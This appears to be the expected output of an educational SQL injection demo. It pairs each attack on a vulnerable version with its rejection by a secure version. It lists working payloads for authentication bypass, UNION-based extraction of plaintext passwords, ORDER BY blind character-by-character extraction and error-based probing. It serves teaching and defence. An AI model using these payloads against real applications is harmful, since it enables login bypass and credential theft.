@@ -1,0 +1,41 @@
+==============================================================================
+ SQL Injection demo: OWASP Top 10:2025 A05 Injection | CWE-89 | ATT&CK T1190
+==============================================================================
+
+▶ Auth bypass (tautology)
+  payload: ("admin' --", 'anything')
+  ❌ vulnerable -> ('admin', 'admin')
+  ✅ secure     -> rejected: invalid credentials / no rows
+
+▶ Auth bypass (OR 1=1)
+  payload: ("x' OR '1'='1", "x' OR '1'='1")
+  ❌ vulnerable -> ('admin', 'admin')
+  ✅ secure     -> rejected: invalid credentials / no rows
+
+▶ UNION data exfiltration
+  payload: ("x' UNION SELECT username, password_pt FROM users --", 'username')
+  ❌ vulnerable -> [('admin', 'Correct-Horse-Battery-Staple-42'), ('asmith', 'quiet-river-copper-19'), ('jdoe', 'spring-meadow-lantern-77'), ('mlee', 'amber-forest-signal-08')]
+  ✅ secure     -> rejected: invalid credentials / no rows
+
+▶ ORDER BY blind: is admin pw[1]=='C'?
+  payload: ('IT', "CASE WHEN (SELECT substr(password_pt,1,1) FROM users WHERE username='admin')='C' THEN id ELSE -id END")
+  ❌ vulnerable -> [('admin', 'IT'), ('mlee', 'IT')]
+     (admin listed first = guess correct; attacker repeats per character)
+  ✅ secure     -> [('admin', 'IT'), ('mlee', 'IT')]
+
+▶ ORDER BY blind: is admin pw[1]=='X'?
+  payload: ('IT', "CASE WHEN (SELECT substr(password_pt,1,1) FROM users WHERE username='admin')='X' THEN id ELSE -id END")
+  ❌ vulnerable -> [('mlee', 'IT'), ('admin', 'IT')]
+     (admin listed first = guess correct; attacker repeats per character)
+  ✅ secure     -> [('admin', 'IT'), ('mlee', 'IT')]
+
+▶ Error-based probing
+  payload: ("admin'", 'x')
+  ❌ vulnerable -> DB ERROR LEAKED TO USER: unrecognized token: "x'"
+  ✅ secure     -> rejected: invalid credentials / no rows
+
+▶ Legitimate login still works on the secure version:
+  ✅ secure     -> ('jdoe', 'user')
+
+▶ Write attempt through the read-only (least-privilege) connection:
+  ✅ blocked: attempt to write a readonly database
